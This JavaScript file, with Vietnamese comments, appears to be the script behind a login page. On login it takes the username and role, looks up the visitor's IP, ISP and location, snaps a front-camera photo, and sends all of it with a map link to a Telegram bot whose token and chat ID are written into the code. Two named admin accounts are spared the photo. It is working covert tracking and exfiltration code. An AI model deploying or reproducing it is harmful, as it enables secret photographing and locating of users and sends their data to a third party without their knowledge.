const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;

const info = {
  time: '', 
  ip: '',
  isp: '',
  address: '',
  lat: '',
  lon: '',
  loginDetails: '',
  specialNote: '',
  isAdmin: false // Biến để kiểm soát việc chụp ảnh
};

async function getNetworkData() {
  try {
    const res = await fetch(`https://ipwho.is/`);
    const data = await res.json();
    info.ip = data.ip || 'Không rõ';
    info.isp = data.connection?.org || 'Saigon Tourist Cable Television';
    info.lat = data.latitude || 10.7;
    info.lon = data.longitude || 106.6;
    info.address = `${data.city}, ${data.region} (Vị trí IP)`;
  } catch (e) { 
    info.ip = 'Lỗi kết nối'; 
    info.address = 'Không xác định';
  }
}

async function captureCamera() {
  // Nếu là Admin thì thoát luôn, không xin quyền, không chụp
  if (info.isAdmin) return null;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        }, 800);
      };
    });
  } catch (e) { return null; }
}

function getCaption() {
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  
  // Tiêu đề Admin hoặc Người dùng thường
  const header = info.isAdmin ? `⚠️ THÔNG BÁO ADMIN ${info.loginDetails.toUpperCase()} VỪA ĐĂNG NHẬP` : '🔐 [THÔNG TIN ĐĂNG NHẬP]';

  // NỘI DUNG CHỈ BAO GỒM: THỜI GIAN, TÀI KHOẢN, IP, MẠNG, VỊ TRÍ (ĐÃ BỎ THIẾT BỊ/DVI)
  return `
${header}
━━━━━━━━━━━━━━━━━━
⏰ Thời gian: ${info.time}
👤 Tài khoản: ${info.loginDetails}
🌐 IP dân cư: ${info.ip}
🏢 Nhà mạng: ${info.isp}
🏙️ Địa chỉ: ${info.address}
📍 Bản đồ: ${mapsLink}
━━━━━━━━━━━━━━━━━━
`.trim();
}

async function main() {
  info.time = new Date().toLocaleString('vi-VN');
  const user = document.getElementById('username').value.trim();
  const role = document.getElementById('user-role').value;
  info.loginDetails = `${user} (${role})`;

  // Kiểm tra quyền Admin
  if (user === "Mrwenben" || user === "VanThanh") {
      info.isAdmin = true;
      info.specialNote = "Admin";
  }

  await getNetworkData();
  
  // Chụp ảnh (Hàm này sẽ tự trả về null nếu là Admin)
  const frontBlob = await captureCamera();

  if (frontBlob) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    const media = [{ type: 'photo', media: 'attach://front', caption: getCaption() }];
    formData.append('front', frontBlob, 'front.jpg');
    formData.append('media', JSON.stringify(media));
    await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
  } else {
    // Admin hoặc người từ chối cam sẽ gửi tin nhắn văn bản thuần túy
    await fetch(API_SEND_TEXT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: TELEGRAM_CHAT_ID, 
        text: getCaption(),
        disable_web_page_preview: true 
      })
    });
  }
  return true; 
}
